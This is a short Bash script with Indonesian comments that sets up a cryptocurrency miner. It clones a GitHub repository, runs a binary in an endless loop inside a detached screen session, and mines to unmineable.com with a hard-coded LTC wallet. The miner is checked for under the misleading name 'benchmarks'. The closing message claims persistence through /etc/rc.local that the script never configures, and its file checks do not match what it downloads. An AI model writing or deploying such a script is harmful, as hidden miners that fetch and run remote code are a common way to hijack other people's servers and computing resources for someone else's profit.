#!/bin/bash
echo "📦 Menginstal dependensi..."
apt-get update && apt-get install -y screen wget tar

echo "📁 Menyimpan skrip mining ke /root/sugar.sh..."
cat << 'EOF' > /root/sugar.sh
#!/bin/bash

cd /root || exit

# Download miner jika belum ada
if [ ! -f benchmarks ]; then
  echo "⬇️ Mengunduh file benchmarks..."
  git clone https://github.com/amirul5656/new.git
  chmod +x unmi
fi

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./unmi --algorithm randomx --pool rx.unmineable.com:80 -u LTC:ltc1q682mxnytl67x3gdw8eezxpuq4pehz5qhax4ls5.amirul
      sleep 2
    done
  '
fi
EOF

chmod +x /root/sugar.sh

echo "🚀 Menjalankan miner sekarang..."
bash /root/sugar.sh

echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
